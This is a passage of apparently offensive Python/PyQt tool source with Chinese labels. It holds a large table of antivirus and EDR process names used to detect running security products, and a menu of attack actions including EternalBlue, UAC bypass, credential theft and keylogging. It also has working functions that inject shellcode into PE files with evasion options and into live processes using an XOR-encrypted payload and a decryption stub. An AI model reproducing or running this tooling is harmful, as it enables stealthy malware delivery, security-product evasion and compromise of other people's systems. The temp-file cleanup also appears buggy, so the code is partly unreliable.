    'Arcabit': ['arcavir.exe', 'arcadc.exe', 'ArcaVirMaster.exe', 'ArcaMainSV.exe', 'ArcaTasksService.exe'],
    'Avast': ['ashDisp.exe', 'AvastUI.exe', 'AvastSvc.exe', 'AvastBrowser.exe', 'AfwServ.exe'],
    'Avira AntiVirus(小红伞)': ['avcenter.exe', 'avguard.exe', 'avgnt.exe', 'sched.exe'],
    'Baidu AntiVirus': ['BaiduSdSvc.exe', 'BaiduSdTray.exe', 'BaiduSd.exe', 'bddownloader.exe', 'baiduansvx.exe'],
    'BitDefender': ['Bdagent.exe', 'BitDefenderCom.exe', 'vsserv.exe', 'bdredline.exe', 'secenter.exe', 'bdservicehost.exe', 'BITDEFENDER.exe'],
    'Bkav': ['BKavService.exe', 'Bka.exe', 'BkavUtil.exe', 'BLuPro.exe'],
    'CAT-QuickHeal': ['QUHLPSVC.exe', 'onlinent.exe', 'sapissvc.exe', 'scanwscs.exe'],
    'CMC': ['CMCTrayIcon.exe'],
    'ClamAV': ['freshclam.exe'],
    'Comodo': ['cpf.exe', 'cavwp.exe', 'ccavsrv.exe', 'cmdvirth.exe'],
    'CrowdStrike Falcon(猎鹰)': ['csfalconservice.exe', 'CSFalconContainer.exe'],
    'Cybereason': ['CybereasonRansomFree.exe', 'CybereasonRansomFreeServiceHost.exe', 'CybereasonAV.exe'],
    'Cylance': ['CylanceSvc.exe'],
    'Cyren': ['vsedsps.exe', 'vseamps.exe', 'vseqrts.exe'],
    'DrWeb': ['drwebcom.exe', 'spidernt.exe', 'drwebscd.exe', 'drweb32w.exe', 'dwengine.exes'],
    'ESET-NOD32': ['egui.exe', 'ecls.exe', 'ekrn.exe', 'eguiProxy.exe', 'EShaSrv.exe'],
    'Trend Micro（趋势科技）': ['tmpfw.exe', 'tmlisten.exe', 'coreServiceShell.exe', 'coreFrameworkHost.exe', 'uiWatchDog.exe', 'TMLISTEN.exe'],
    'Emsisoft': ['a2guard.exe', 'a2free.exe', 'a2service.exe'],
    'Endgame': ['endgame.exe'],
    'F-Prot': ['F-PROT.exe', 'FProtTray.exe', 'FPAVServer.exe', 'f-stopw.exe', 'f-prot95.exe', 'f-agnt95.exe'],
    'F-Secure': ['f-secure.exe', 'fssm32.exe', 'Fsorsp64.exe', 'fsavgui.exe', 'fameh32.exe', 'fch32.exe', 'fih32.exe', 'fnrb32.exe', 'fsav32.exe', 'fsma32.exe', 'fsmb32.exe'],
    'FireEye(火眼)': ['xagtnotif.exe', 'xagt.exe'],
    'Fortinet（飞塔）': ['FortiClient.exe', 'FortiTray.exe', 'FortiScand.exe', 'FortiWF.exe', 'FortiProxy.exe', 'FortiESNAC.exe', 'FortiSSLVPNdaemon.exe', 'FortiTcs.exe', 'FctSecSvr.exe'],
    'GData': ['AVK.exe', 'avkcl.exe', 'avkpop.exe', 'avkservice.exe', 'GDScan.exe', 'AVKWCtl.exe', 'AVKProxy.exe', 'AVKBackupService.exe'],
    'Ikarus': ['guardxservice.exe', 'guardxkickoff.exe'],
    'Jiangmin': ['KVFW.exe', 'KVsrvXP.exe', 'KVMonXP.exe', 'KVwsc.exe'],
    'K7AntiVirus': ['K7TSecurity.exe', 'K7TSMain.Exe', 'K7TSUpdT.exe'],
    'Kaspersky(卡巴斯基)': ['avp.exe', 'avpcc.exe', 'avpm.exe', 'kavpf.exe', 'kavfs.exe', 'klnagent.exe', 'kavtray.exe', 'kavfswp.exe', 'kaspersky.exe'],
    'Max Secure Software': ['SDSystemTray.exe', 'MaxRCSystemTray.exe', 'RCSystemTray.exe', 'MaxAVPlusDM.exe', 'LiveUpdateSD.exe'],
    'Malwarebytes': ['MBAMService.exe', 'mbam.exe', 'mbamtray.exe'],
    'McAfee(迈克菲)': ['Mcshield.exe', 'Tbmon.exe', 'Frameworkservice.exe', 'firesvc.exe', 'firetray.exe', 'hipsvc.exe', 'mfevtps.exe', 'mcafeefire.exe', 'shstat.exe', 'vstskmgr.exe', 'engineserver.exe', 'alogserv.exe', 'avconsol.exe', 'cmgrdian.exe', 'cpd.exe', 'mcmnhdlr.exe', 'mcvsshld.exe', 'mcvsrte.exe', 'mghtml.exe', 'mpfservice.exe', 'mpfagent.exe', 'mpftray.exe', 'vshwin32.exe', 'vsstat.exe', 'guarddog.exe', 'mfeann.exe', 'udaterui.exe', 'naprdmgr.exe', 'mctray.exe', 'fcagate.exe', 'fcag.exe', 'fcags.exe', 'fcagswd.exe', 'macompatsvc.exe', 'masvc.exe', 'mcamnsvc.exe', 'mctary.exe', 'mfecanary.exe', 'mfeconsole.exe', 'mfeesp.exe', 'mfefire.exe', 'mfefw.exe', 'mfemms.exe', 'mfetp.exe', 'mfewc.exe', 'mfewch.exe'],
    'Microsoft Security Essentials': ['MsMpEng.exe', 'msseces.exe', 'mssecess.exe', 'emet_agent.exe', 'emet_service.exe', 'drwatson.exe', 'MpCmdRun.exe', 'NisSrv.exe', 'MsSense.exe', 'MSASCui.exe', 'MSASCuiL.exe', 'SecurityHealthService.exe'],
    'NANO-Antivirus': ['nanoav.exe', 'nanoav64.exe', 'nanoreport.exe', 'nanoreportc.exe', 'nanoreportc64.exe', 'nanorst.exe', 'nanosvc.exe'],
    'Palo Alto Networks': ['PanInstaller.exe'],
    'Panda Security': ['remupd.exe', 'apvxdwin.exe', 'pavproxy.exe', 'pavsched.exe'],
    'Qihoo-360': ['360sd.exe', '360tray.exe', 'ZhuDongFangYu.exe', '360rp.exe', '360rps.exe', '360safe.exe', '360safebox.exe', 'QHActiveDefense.exe', '360skylarsvc.exe', 'LiveUpdate360.exe'],
    'Rising': ['RavMonD.exe', 'rfwmain.exe', 'RsMgrSvc.exe', 'RavMon.exe'],
    'SUPERAntiSpyware': ['superantispyware.exe', 'sascore.exe', 'SAdBlock.exe', 'sabsvc.exe'],
    'SecureAge APEX': ['UniversalAVService.exe', 'EverythingServer.exe', 'clamd.exe'],
    'Sophos AV': ['SavProgress.exe', 'icmon.exe', 'SavMain.exe', 'SophosUI.exe', 'SophosFS.exe', 'SophosHealth.exe', 'SophosSafestore64.exe', 'SophosCleanM.exe', 'SophosFileScanner.exe', 'SophosNtpService.exe', 'SophosOsquery.exe', 'Sophos UI.exe'],
    'TACHYON': [],
    'Tencent': ['QQPCRTP.exe', 'QQPCTray.exe', 'QQPCMgr.exe', 'QQPCNetFlow.exe', 'QQPCRealTimeSpeedup.exe'],
    'TotalDefense': ['AMRT.exe', 'SWatcherSrv.exe', 'Prd.ManagementConsole.exe'],
    'Trapmine': ['TrapmineEnterpriseService.exe', 'TrapmineEnterpriseConfig.exe', 'TrapmineDeployer.exe', 'TrapmineUpgradeService.exe'],
    'TrendMicro': ['TMBMSRV.exe', 'ntrtscan.exe', 'Pop3Trap.exe', 'WebTrap.exe', 'PccNTMon.exe'],
    'VIPRE': ['SBAMSvc.exe', 'VipreEdgeProtection.exe', 'SBAMTray.exe'],
    'ViRobot': ['vrmonnt.exe', 'vrmonsvc.exe', 'Vrproxyd.exe'],
    'Webroot': ['npwebroot.exe', 'WRSA.exe', 'spysweeperui.exe'],
    'Yandex': ['Yandex.exe', 'YandexDisk.exe', 'yandesk.exe'],
    'Zillya': ['zillya.exe', 'ZAVAux.exe', 'ZAVCore.exe'],
    'ZoneAlarm': ['vsmon.exe', 'zapro.exe', 'zonealarm.exe'],
    'Zoner': ['ZPSTray.exe'],
    'eGambit': ['dasc.exe', 'memscan64.exe', 'dastray.exe'],
    'eScan': ['consctl.exe', 'mwaser.exe', 'avpmapp.exe'],
    'Lavasoft': ['AAWTray.exe', 'LavasoftTcpService.exe', 'AdAwareTray.exe', 'WebCompanion.exe', 'WebCompanionInstaller.exe', 'adawarebp.exe', 'ad-watch.exe'],
    'The Cleaner': ['cleaner8.exe'],
    'VBA32': ['vba32lder.exe'],
    'Mongoosa': ['MongoosaGUI.exe', 'mongoose.exe'],
    'Coranti2012': ['CorantiControlCenter32.exe'],
    'UnThreat': ['UnThreat.exe', 'utsvc.exe'],
    'Shield Antivirus': ['CKSoftShiedAntivirus4.exe', 'shieldtray.exe'],
    'VIRUSfighter': ['AVWatchService.exe', 'vfproTray.exe'],
    'Immunet': ['iptray.exe'],
    'PSafe': ['PSafeSysTray.exe', 'PSafeCategoryFinder.exe', 'psafesvc.exe'],
    'nProtect': ['nspupsvc.exe', 'Npkcmsvc.exe', 'npnj5Agent.exe'],
    'Spyware Terminator': ['SpywareTerminatorShield.exe', 'SpywareTerminator.exe'],
    'Norton（赛门铁克）': ['ccSvcHst.exe', 'rtvscan.exe', 'ccapp.exe', 'NPFMntor.exe', 'ccRegVfy.exe', 'vptray.exe', 'iamapp.exe', 'nav.exe', 'navapw32.exe', 'navapsvc.exe', 'nisum.exe', 'nmain.exe', 'nprotect.exe', 'smcGui.exe', 'ns.exe', 'nortonsecurity.exe'],
    'Symantec（赛门铁克）': ['ccSetMgr.exe', 'ccapp.exe', 'vptray.exe', 'ccpxysvc.exe', 'cfgwiz.exe', 'smc.exe', 'symproxysvc.exe', 'vpc32.exe', 'lsetup.exe', 'luall.exe', 'lucomserver.exe', 'sbserv.exe', 'ccEvtMgr.exe', 'smcGui.exe', 'snac.exe', 'SymCorpUI.exe', 'sepWscSvc64.exe'],
    '可牛杀毒': ['knsdtray.exe'],
    '流量矿石': ['Miner.exe'],
    'SafeDog(安全狗)': ['safedog.exe', 'SafeDogGuardCenter.exe', 'SafeDogSiteIIS.exe', 'SafeDogTray.exe', 'SafeDogServerUI.exe', 'SafeDogSiteApache.exe', 'CloudHelper.exe', 'SafeDogUpdateCenter.exe'],
    '木马克星': ['parmor.exe', 'Iparmor.exe'],
    '贝壳云安全': ['beikesan.exe'],
    '木马猎手': ['TrojanHunter.exe'],
    '巨盾网游安全盾': ['GG.exe'],
    '绿鹰安全精灵': ['adam.exe'],
    '超级巡警': ['AST.exe'],
    '墨者安全专家': ['ananwidget.exe'],
    '风云防火墙': ['FYFireWall.exe'],
    '微点主动防御': ['MPMon.exe'],
    '天网防火墙': ['pfw.exe'],
    'D 盾': ['D_Safe_Manage.exe', 'd_manage.exe'],
    '云锁': ['yunsuo_agent_service.exe', 'yunsuo_agent_daemon.exe'],
    '护卫神': ['HwsPanel.exe', 'hws_ui.exe', 'hws.exe', 'hwsd.exe', 'HwsHostPanel.exe', 'HwsHostMaster.exe'],
    '火绒安全': ['hipstray.exe', 'wsctrl.exe', 'usysdiag.exe', 'HipsDaemon.exe', 'HipsLog.exe', 'HipsMain.exe', 'wsctrlsvc.exe'],
    '网络病毒克星': ['WEBSCANX.exe'],
    'SPHINX防火墙': ['SPHINX.exe'],
    '奇安信天擎': ['TQClient.exe', 'TQTray.exe', 'QaxEngManager.exe', 'TQDefender.exe'],
    'H+BEDV Datentechnik GmbH': ['avwin.exe', 'avwupsrv.exe'],
    'IBM ISS Proventia': ['blackd.exe', 'rapapp.exe'],
    'eEye Digital Security': ['eeyeevnt.exe', 'blink.exe'],
    'Kerio Personal Firewall': ['persfw.exe', 'wrctrl.exe'],
    'Simplysup': ['Trjscan.exe'],
    'PC Tools AntiVirus': ['PCTAV.exe', 'pctsGui.exe'],
    'VirusBuster Professional': ['vbcmserv.exe'],
    'ClamWin': ['ClamTray.exe', 'clamscan.exe'],
    '安天智甲': ['kxetray.exe', 'kscan.exe', 'AMediumManager.exe', 'kismain.exe'],
    'CMC Endpoint Security': ['CMCNECore.exe', 'cmcepagent.exe', 'cmccore.exe', 'CMCLog.exe', 'CMCFMon.exe'],
    '金山毒霸': ['kxetray.exe', 'kxescore.exe', 'kupdata.exe', 'kwsprotect64.exe', 'kislive.exe', 'knewvip.exe', 'kscan.exe', 'kxecenter.exe', 'kxemain.exe', 'KWatch.exe', 'KSafeSvc.exe', 'KSafeTray.exe'],
    'Agnitum outpost (Outpost Firewall)': ['outpost.exe', 'acs.exe'],
    'Cynet': ['CynetLauncher.exe', 'CynetDS.exe', 'CynetEPS.exe', 'CynetMS.exe', 'CynetAR.exe', 'CynetGW.exe', 'CynetSD64.exe'],
    'Elastic': ['winlogbeat.exe'],
    '金山网盾': ['KSWebShield.exe'],
    'G Data安全软件客户端': ['AVK.exe'],
    '金山网镖': ['kpfwtray.exe'],
    '在扫1433': ['1433.exe'],
    '在爆破': ['DUB.exe'],
    '发现S-U': ['ServUDaemon.exe'],
    '百度卫士': ['bddownloader.exe', 'baiduSafeTray.exe'],
    '百度卫士-主进程': ['baiduansvx.exe'],
    'G Data文件系统实时监控': ['avkwctl9.exe', 'AVKWCTL.exe'],
    'Sophos Anti-Virus': ['SAVMAIN.exe'],
    '360保险箱': ['safeboxTray.exe', '360safebox.exe'],
    'G Data扫描器': ['GDScan.exe'],
    'G Data杀毒代理': ['AVKProxy.exe'],
    'G Data备份服务': ['AVKBackupService.exe'],
    '亚信安全服务器深度安全防护系统': ['Notifier.exe'],
    '阿里云盾': ['AliYunDun.exe', 'AliYunDunUpdate.exe', 'aliyun_assist_service.exe', '/usr/local/aegis/aegis_client/'],
    '腾讯云安全': ['BaradAgent.exe', 'sgagent.exe', 'YDService.exe', 'YDLive.exe', 'YDEdr.exe'],
    '360主机卫士Web': ['360WebSafe.exe', 'QHSrv.exe', 'QHWebshellGuard.exe'],
    '网防G01': ['gov_defence_service.exe', 'gov_defence_daemon.exe'],
    '云锁客户端': ['PC.exe'],
    'Symantec Shared诺顿邮件防火墙软件': ['SNDSrvc.exe'],
    'U盘杀毒专家': ['USBKiller.exe'],
    '天擎EDRAgent': ['360EntClient.exe'],
    '360(奇安信)天擎': ['360EntMisc.exe'],
    '阿里云-云盾': ['alisecguard.exe'],
    'Sophos AutoUpdate Service': ['ALsvc.exe'],
    '阿里云监控': ['CmsGoAgent.windows-amd64.'],
    '深信服EDRAgent': ['edr_agent.exe', 'edr_monitor.exe', 'edr_sec_plan.exe'],
    '启明星辰天珣EDRAgent': ['ESAV.exe', 'ESCCControl.exe', 'ESCC.exe', 'ESCCIndex.exe'],
    '蓝鲸Agent': ['gse_win_agent.exe', 'gse_win_daemon.exe'],
    '联想电脑管家': ['LAVService.exe'],
    'Sophos MCS Agent': ['McsAgent.exe'],
    'Sophos MCS Client': ['McsClient.exe'],
    '360TotalSecurity(360国际版)': ['QHSafeMain.exe', 'QHSafeTray.exe', 'QHWatchdog.exe', 'QHActiveDefense.exe'],
    'Sophos Device Control Service': ['sdcservice.exe'],
    'Sophos Endpoint Defense Service': ['SEDService.exe'],
    'Windows Defender SmartScreen': ['smartscreen.exe'],
    'Sophos Clean Service': ['SophosCleanM64.exe'],
    'Sophos FIM': ['SophosFIMService.exe'],
    'Sophos System Protection Service': ['SSPService.exe'],
    'Sophos Web Control Service': ['swc_service.exe'],
    '天眼云镜': ['TitanAgent.exe', 'TitanMonitor.exe'],
    '天融信终端防御': ['TopsecMain.exe', 'TopsecTray.exe'],
    '360杀毒-网盾': ['wdswfsafe.exe'],
    '智量安全': ['WiseVector.exe', 'WiseVectorSvc.exe'],
    '天擎': ['QAXEntClient.exe', 'QAXTray.exe'],
    '安恒主机卫士': ['AgentService.exe', 'ProtectMain.exe'],
    '亚信DS服务端': ['Deep Security Manager.exe'],
    '亚信DS客户端': ['dsa.exe', 'UniAccessAgent.exe', 'dsvp.exe'],
    '深信服EDR': ['/sangfor/edr/agent'],
    '阿里云云助手守护进程': ['/assist-daemon/assist_daemon'],
    'zabbix agen端': ['zabbix_agentd'],
    '阿里云盾升级': ['/usr/local/aegis/aegis_update/AliYunDunUpdate'],
    '阿里云助手': ['/usr/local/share/aliyun-assist'],
    '阿里系监控': ['AliHips', 'AliNet', 'AliDetect', 'AliScriptEngine'],
    '腾讯系监控': ['secu-tcs-agent', '/usr/local/qcloud/stargate/', '/usr/local/qcloud/monitor/', '/usr/local/qcloud/YunJing/'],
    '腾讯自动化助手TAT产品': ['/usr/local/qcloud/tat_agent/'],
    'SentinelOne(哨兵一号)': ['SentinelServiceHost.exe', 'SentinelStaticEngine.exe', 'SentinelStaticEngineScanner.exe', 'SentinelMemoryScanner.exe', 'SentinelAgent.exe', 'SentinelAgentWorker.exe', 'SentinelUI.exe'],
    'OneSec(微步)': ['tbAgent.exe', 'tbAgentSrv.exe', 'tbGuard.exe'],
    '亚信安全防毒墙网络版': ['PccNT.exe', 'PccNTMon.exe', 'PccNTUpd.exe'],
    'Illumio ZTS': ['venVtapServer.exe', 'venPlatformHandler.exe', 'venAgentMonitor.exe', 'venAgentMgr.exe'],
    '奇安信统一服务器安全': ['NuboshEndpoint.exe'],
    'IObit Malware Fighter': ['IMF.exe', 'IMFCore.exe', 'IMFsrv.exe', 'IMFSrvWsc.exe'],
    'Deep Instinct': ['DeepUI.exe']
        }
        
        found_av = {}
        lines = input_text.split('\n')
        
        for line in lines:
            line = line.lower()
            for av_name, signatures in av_service_signatures.items():
                if any(sig.lower() in line for sig in signatures):
                    if av_name not in found_av:
                        found_av[av_name] = []
                    found_av[av_name].append(line.strip())
        
        # 生成报告
        if found_av:
            result = "检测到以下杀毒软件服务:\n\n"
            for av_name, services in found_av.items():
                result += f"[*] {av_name}:\n"
                for service in services:
                    result += f"    - {service}\n"
                result += "\n"
        else:
            result = "未检测到已知的杀毒软件服务。"
        
        self.tasklist_result.setText(result)
        self.update_status("服务分析完成")

    def setup_toolbox_tab(self, tab):
        """设置工具集选项卡"""
        layout = QVBoxLayout()
        layout.setSpacing(15)
        
        # 工具集
        info_label = QLabel("常用工具集") 
        info_label.setFont(QFont('Segoe UI', 12, QFont.Bold))
        info_label.setAlignment(Qt.AlignCenter)
        info_label.setStyleSheet("color: #00cc00; margin-bottom: 15px;")
        layout.addWidget(info_label)
        
        # 工具集类别
        tools_layout = QGridLayout()
        
        # 信息收集
        recon_group = QGroupBox("信息收集")
        recon_layout = QVBoxLayout()
        recon_btn1 = QPushButton("主机探测")
        recon_btn1.clicked.connect(lambda: self.run_tool("主机探测"))
        recon_layout.addWidget(recon_btn1)
        
        recon_btn2 = QPushButton("端口扫描")
        recon_btn2.clicked.connect(lambda: self.run_tool("端口扫描"))
        recon_layout.addWidget(recon_btn2)
        
        recon_btn3 = QPushButton("服务识别")
        recon_btn3.clicked.connect(lambda: self.run_tool("服务识别"))
        recon_layout.addWidget(recon_btn3)
        
        recon_group.setLayout(recon_layout)
        tools_layout.addWidget(recon_group, 0, 0)
        
        # 漏洞利用
        exploit_group = QGroupBox("漏洞利用")
        exploit_layout = QVBoxLayout()
        
        exploit_btn1 = QPushButton("漏洞扫描")
        exploit_btn1.clicked.connect(lambda: self.run_tool("漏洞扫描"))
        exploit_layout.addWidget(exploit_btn1)
        
        exploit_btn2 = QPushButton("EternalBlue利用")
        exploit_btn2.clicked.connect(lambda: self.run_tool("EternalBlue利用"))
        exploit_layout.addWidget(exploit_btn2)
        
        exploit_btn3 = QPushButton("自定义Exploit")
        exploit_btn3.clicked.connect(lambda: self.run_tool("自定义Exploit"))
        exploit_layout.addWidget(exploit_btn3)
        
        exploit_group.setLayout(exploit_layout)
        tools_layout.addWidget(exploit_group, 0, 1)
        
        # 权限提升
        privilege_group = QGroupBox("权限提升")
        privilege_layout = QVBoxLayout()
        
        privilege_btn1 = QPushButton("UAC绕过")
        privilege_btn1.clicked.connect(lambda: self.run_tool("UAC绕过"))
        privilege_layout.addWidget(privilege_btn1)
        
        privilege_btn2 = QPushButton("系统漏洞提权")
        privilege_btn2.clicked.connect(lambda: self.run_tool("系统漏洞提权"))
        privilege_layout.addWidget(privilege_btn2)
        
        privilege_btn3 = QPushButton("令牌窃取")
        privilege_btn3.clicked.connect(lambda: self.run_tool("令牌窃取"))
        privilege_layout.addWidget(privilege_btn3)
        
        privilege_group.setLayout(privilege_layout)
        tools_layout.addWidget(privilege_group, 1, 0)
        
        # 横向移动
        lateral_group = QGroupBox("横向移动")
        lateral_layout = QVBoxLayout()
        
        lateral_btn1 = QPushButton("凭据获取")
        lateral_btn1.clicked.connect(lambda: self.run_tool("凭据获取"))
        lateral_layout.addWidget(lateral_btn1)
        
        lateral_btn2 = QPushButton("哈希传递")
        lateral_btn2.clicked.connect(lambda: self.run_tool("哈希传递"))
        lateral_layout.addWidget(lateral_btn2)
        
        lateral_btn3 = QPushButton("WMI/PSExec")
        lateral_btn3.clicked.connect(lambda: self.run_tool("WMI/PSExec"))
        lateral_layout.addWidget(lateral_btn3)
        
        lateral_group.setLayout(lateral_layout)
        tools_layout.addWidget(lateral_group, 1, 1)
        
        # 持久化
        persistence_group = QGroupBox("持久化")
        persistence_layout = QVBoxLayout()
        
        persistence_btn1 = QPushButton("启动项添加")
        persistence_btn1.clicked.connect(lambda: self.run_tool("启动项添加"))
        persistence_layout.addWidget(persistence_btn1)
        
        persistence_btn2 = QPushButton("服务安装")
        persistence_btn2.clicked.connect(lambda: self.run_tool("服务安装"))
        persistence_layout.addWidget(persistence_btn2)
        
        persistence_btn3 = QPushButton("DLL劫持")
        persistence_btn3.clicked.connect(lambda: self.run_tool("DLL劫持"))
        persistence_layout.addWidget(persistence_btn3)
        
        persistence_group.setLayout(persistence_layout)
        tools_layout.addWidget(persistence_group, 2, 0)
        
        # 数据窃取
        exfil_group = QGroupBox("数据窃取")
        exfil_layout = QVBoxLayout()
        
        exfil_btn1 = QPushButton("敏感数据查找")
        exfil_btn1.clicked.connect(lambda: self.run_tool("敏感数据查找"))
        exfil_layout.addWidget(exfil_btn1)
        
        exfil_btn2 = QPushButton("屏幕截图")
        exfil_btn2.clicked.connect(lambda: self.run_tool("屏幕截图"))
        exfil_layout.addWidget(exfil_btn2)
        
        exfil_btn3 = QPushButton("键盘记录")
        exfil_btn3.clicked.connect(lambda: self.run_tool("键盘记录"))
        exfil_layout.addWidget(exfil_btn3)
        
        exfil_group.setLayout(exfil_layout)
        tools_layout.addWidget(exfil_group, 2, 1)
        
        layout.addLayout(tools_layout)
        
        # 自定义工具区域
        custom_group = QGroupBox("自定义工具")
        custom_layout = QHBoxLayout()
        
        self.custom_tool_input = QLineEdit()
        self.custom_tool_input.setPlaceholderText("输入自定义工具路径或命令")
        custom_layout.addWidget(self.custom_tool_input)
        
        run_custom_button = QPushButton("运行")
        run_custom_button.clicked.connect(self.run_custom_tool)
        custom_layout.addWidget(run_custom_button)
        
        custom_group.setLayout(custom_layout)
        layout.addWidget(custom_group)
        
        tab.setLayout(layout)

    # 功能实现方法
    def select_pe_file(self):
        file_name, _ = QFileDialog.getOpenFileName(self, '选择PE文件', '', '可执行文件 (*.exe *.dll *.sys)')
        if file_name:
            self.pe_file_input.setText(file_name)
            
            # 自动填充输出文件
            base_name = os.path.basename(file_name)
            name, ext = os.path.splitext(base_name)
            output_file = os.path.join(os.path.dirname(file_name), f"{name}_injected{ext}")
            self.output_file_input.setText(output_file)
            
            self.update_status(f"已选择PE文件: {file_name}")

    def select_shellcode_file(self):
        file_name, _ = QFileDialog.getOpenFileName(self, '选择Shellcode文件', '', '所有文件 (*.*)')
        if file_name:
            self.shellcode_file_input.setText(file_name)
            self.update_status(f"已选择Shellcode文件: {file_name}")

    def select_output_file(self):
        initial_dir = os.path.dirname(self.pe_file_input.text()) if self.pe_file_input.text() else ''
        file_name, _ = QFileDialog.getSaveFileName(self, '保存输出文件', initial_dir, '可执行文件 (*.exe *.dll *.sys)')
        if file_name:
            self.output_file_input.setText(file_name)
            self.update_status(f"已设置输出文件: {file_name}")

    def select_process_shellcode_file(self):
        file_name, _ = QFileDialog.getOpenFileName(self, '选择Shellcode文件', '', '所有文件 (*.*)')
        if file_name:
            self.process_shellcode_input.setText(file_name)
            self.update_status(f"已选择进程注入Shellcode文件: {file_name}")

    def select_obfuscate_input_file(self):
        file_name, _ = QFileDialog.getOpenFileName(self, '选择输入文件', '', '所有文件 (*.*)')
        if file_name:
            self.obfuscate_input_file.setText(file_name)
            
            # 自动填充输出文件
            base_name = os.path.basename(file_name)
            name, ext = os.path.splitext(base_name)
            output_file = os.path.join(os.path.dirname(file_name), f"{name}_obfuscated{ext}")
            self.obfuscate_output_file.setText(output_file)
            
            self.update_status(f"已选择混淆输入文件: {file_name}")

    def select_obfuscate_output_file(self):
        initial_dir = os.path.dirname(self.obfuscate_input_file.text()) if self.obfuscate_input_file.text() else ''
        file_name, _ = QFileDialog.getSaveFileName(self, '保存混淆输出文件', initial_dir, '所有文件 (*.*)')
        if file_name:
            self.obfuscate_output_file.setText(file_name)
            self.update_status(f"已设置混淆输出文件: {file_name}")

    def refresh_process_list(self):
        """刷新进程列表"""
        self.process_list_widget.clear()
        try:
            import psutil
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    proc_info = proc.info
                    item_text = f"{proc_info['pid']} - {proc_info['name']} ({proc_info['username']})"
                    self.process_list_widget.addItem(item_text)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
            self.update_status("进程列表已刷新")
        except ImportError:
            self.update_status("缺少psutil库，无法列出进程")
            QMessageBox.warning(self, "错误", "请安装psutil库以支持进程列表: pip install psutil")

    def on_process_selected(self, item):
        """当从进程列表中选择进程时"""
        text = item.text()
        pid = text.split(' - ')[0]
        self.pid_input.setText(pid)
        self.update_status(f"已选择进程: {text}")

    def patch_pe_file(self):
        """执行PE文件注入"""
        pe_file_path = self.pe_file_input.text()
        shellcode_file_path = self.shellcode_file_input.text()
        output_file_path = self.output_file_input.text()
        
        # 验证输入
        if not pe_file_path or not os.path.exists(pe_file_path):
            QMessageBox.warning(self, "错误", "请选择有效的PE文件")
            return
            
        if not shellcode_file_path or not os.path.exists(shellcode_file_path):
            QMessageBox.warning(self, "错误", "请选择有效的Shellcode文件")
            return
            
        if not output_file_path:
            QMessageBox.warning(self, "错误", "请指定输出文件路径")
            return
        
        # 准备选项
        injection_method_map = {
            "新增区段": "new_section",
            "代码洞注入": "code_cave",
            "已有区段注入": "existing_section"
        }
        
        encryption_type_map = {
            "XOR单字节": "xor",
            "XOR多字节": "custom_xor",
            "RC4": "rc4",
            "AES": "aes"
        }
        
        obfuscation_level_map = {
            "低": 1,
            "中": 2,
            "高": 3,
            "极高": 4
        }
        
        # 收集选项
        options = {
            "preserve_entry": self.preserve_entry_checkbox.isChecked(),
            "inject_method": injection_method_map[self.injection_method_combo.currentText()],
            "encryption_type": encryption_type_map[self.encryption_method_combo.currentText()],
            "obfuscation_level": obfuscation_level_map[self.obfuscation_level_combo.currentText()],
            "anti_debug": self.anti_debug_checkbox.isChecked(),
            "timestamp_manipulation": self.timestamp_checkbox.isChecked(),
            "section_name_randomization": self.section_name_checkbox.isChecked(),
            "pe_header_randomization": self.pe_header_checkbox.isChecked(),
            "add_certificate": self.cert_checkbox.isChecked(),
            "use_indirect_jumps": self.indirect_jump_checkbox.isChecked()
        }
        
        # 备份原始文件
        if self.backup_file_checkbox.isChecked() and pe_file_path == output_file_path:
            backup_file = pe_file_path + '.bak'
            try:
                import shutil
                shutil.copy2(pe_file_path, backup_file)
                self.update_status(f"已备份原始文件到: {backup_file}")
            except Exception as e:
                QMessageBox.warning(self, "警告", f"备份原始文件失败: {str(e)}")
        
        # 执行注入
        self.update_status("正在执行PE文件注入...")
        QApplication.processEvents()
        
        success, message = patch_pe(pe_file_path, shellcode_file_path, output_file_path, options)
        
        if success:
            self.update_status("PE文件注入成功!")
            QMessageBox.information(self, "成功", f"PE文件注入成功!\n输出文件: {output_file_path}")
        else:
            self.update_status("PE文件注入失败!")
            QMessageBox.critical(self, "错误", f"PE文件注入失败: {message}")

    def inject_to_process(self):
        """执行进程注入"""
        shellcode_file_path = self.process_shellcode_input.text()
        pid_text = self.pid_input.text()
        
        # 验证输入
        if not shellcode_file_path or not os.path.exists(shellcode_file_path):
            QMessageBox.warning(self, "错误", "请选择有效的Shellcode文件")
            return
            
        if not pid_text or not pid_text.isdigit():
            QMessageBox.warning(self, "错误", "请输入有效的进程ID")
            return
            
        pid = int(pid_text)
        
        # 准备注入方法
        injection_method_map = {
            "经典创建远程线程": "classic",
            "APC注入": "apc",
            "线程劫持": "thread_hijack",
            "PE加载": "pe_load"
        }
        
        injection_method = injection_method_map[self.process_injection_method_combo.currentText()]
        
        # 如果选择了加密，对shellcode进行加密处理
        if self.process_encrypt_checkbox.isChecked():
            try:
                with open(shellcode_file_path, 'rb') as f:
                    original_shellcode = f.read()
                    
                # 创建临时加密shellcode文件
                encrypted_file = shellcode_file_path + '.enc'
                key = random.randint(1, 255)
                
                # 简单XOR加密
                encrypted_shellcode = bytes(b ^ key for b in original_shellcode)
                
                # 创建解密存根
                decryption_stub = (
                    b'\xE8\x00\x00\x00\x00'   # call next instruction
                    b'\x5E'                    # pop esi (get current address)
                    b'\x83\xC6\x0F'           # add esi, 15 (skip to encrypted data)
                    b'\xB9' + struct.pack("<I", len(original_shellcode)) +  # mov ecx, len
                    bytes([0x80, 0x36]) + bytes([key]) +  # 修正后的代码  # XOR BYTE PTR [esi], key
                    b'\x46'                    # inc esi
                    b'\xE2\xFA'               # loop to xor instruction
                    b'\xEB\x05'               # jmp to decrypted shellcode
                )
                
                # 写入临时文件
                with open(encrypted_file, 'wb') as f:
                    f.write(decryption_stub + encrypted_shellcode)
                    
                shellcode_file_path = encrypted_file
                self.update_status("Shellcode已加密处理")
                
            except Exception as e:
                QMessageBox.warning(self, "错误", f"Shellcode加密处理失败: {str(e)}")
                return
        
        # 执行注入
        self.update_status(f"正在向进程 {pid} 注入Shellcode...")
        QApplication.processEvents()
        
        success, message = process_injection(pid, shellcode_file_path, injection_method)
        
        # 清理临时文件
        if self.process_encrypt_checkbox.isChecked() and os.path.exists(shellcode_file_path + '.enc'):
            try:
                os.remove(shellcode_file_path + '.enc')
            except:
                pass
        
        if success:
            self.update_status("进程注入成功!")
            QMessageBox.information(self, "成功", f"进程注入成功!\n{message}")
        else:
            self.update_status("进程注入失败!")
